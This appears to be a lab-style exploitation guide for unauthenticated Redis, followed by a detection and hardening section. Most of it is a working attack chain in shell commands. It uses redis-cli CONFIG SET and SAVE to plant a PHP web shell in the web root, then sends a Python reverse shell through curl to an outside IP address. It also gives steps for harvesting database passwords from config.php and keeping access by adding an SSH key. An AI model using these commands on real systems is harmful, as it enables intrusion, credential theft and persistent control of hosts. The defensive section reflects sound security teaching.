# Exploitation Guide: Redis RCE & Post-Exploitation Analysis

## 1. Vulnerability Overview
* **Type:** Unauthenticated Redis Arbitrary File Write (RCE)
* **Severity:** **CRITICAL** (CVSS 10.0)
* **Impact:** Full system compromise. This vulnerability allows an unauthenticated attacker to write files to any directory the Redis process can access. In this environment, it is used to upload a web shell to the Apache web root, leading to remote command execution under the context of the web server user.

## 2. Attack Scenario: The "Exposed Internal Service"
In a realistic corporate environment, developers often deploy Redis as a fast caching layer. Because it is intended to be "internal," they may disable authentication for speed. If a firewall is misconfigured or a server is multihomed, this internal service becomes reachable from the internet. An attacker discovering this port can bypass all web-tier security and interact directly with the backend database to seize control of the host.

## 3. Step 1: Discovery & Reconnaissance
The attacker identifies the attack surface using network scanning.

**Tool:** `nmap`  
**Reasoning:** We target port 6379 to see if the database is exposed.

```bash
nmap -p 80,6379 <TARGET-IP>
```
*(Refer to screenshot: nmap-scan.png)*

## 4. Step 2: Exploitation (Weaponization)
We leverage the `CONFIG SET` command to turn the database into a file-writing tool.

**Tool:** `redis-cli`  
**Reasoning:** Allows direct manipulation of the Redis memory and configuration without needing a custom exploit payload.

```bash
# 1. Point Redis to the web root
redis-cli -h <TARGET-IP> config set dir /var/www/html

# 2. Define the output file as a PHP script
redis-cli -h <TARGET-IP> config set dbfilename exploit.php

# 3. Inject a lightweight PHP web shell
redis-cli -h <TARGET-IP> set shell "<?php system(\$_GET['cmd']); ?>"

# 4. Commit the 'database' (our shell) to disk
redis-cli -h <TARGET-IP> save
```

## 5. Step 3: Post-Exploitation (Impact Analysis)
Once a web shell is established, the attacker moves beyond simple command execution to gain a persistent, interactive presence.

### Establishing a Reverse Shell
**Reasoning:** A web shell is slow and easily logged. A reverse shell provides a real-time terminal.

```bash
# Ensure listener (nc -lvnp 4444) is running first!
curl -G "http://<TARGET-IP>/exploit.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("100.65.7.178",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
```

### Data Exfiltration & Pivoting
After gaining access, an attacker could:
* **Exfiltrate Data:** Access `/var/www/html/config.php` to find database passwords.
* **Persistence:** Add an SSH key to `/home/ansible/.ssh/authorized_keys`.

## 6. Defensive Analysis: Detection & Mitigation

### Detection Strategies
* **Network Level:** Monitor for external traffic directed at port 6379. Redis traffic should never cross the DMZ boundary.
* **Host Level:** Use Auditd or EDR to alert on the `redis-server` process writing files to `/var/www/html`.
* **Log Analysis:** Look for `CONFIG SET` commands in Redis logs or unusual PHP files (like `exploit.php`) appearing in web directories.

### Mitigation & Hardening
1. **Authentication:** Enable a strong password in `redis.conf` using `requirepass`.
2. **Network Isolation:** Bind Redis only to `127.0.0.1`.
3. **Command Renaming:** Rename dangerous commands like `CONFIG` and `SAVE` in the configuration file.
4. **Least Privilege:** Ensure Redis runs as a restricted user who cannot write to the web root.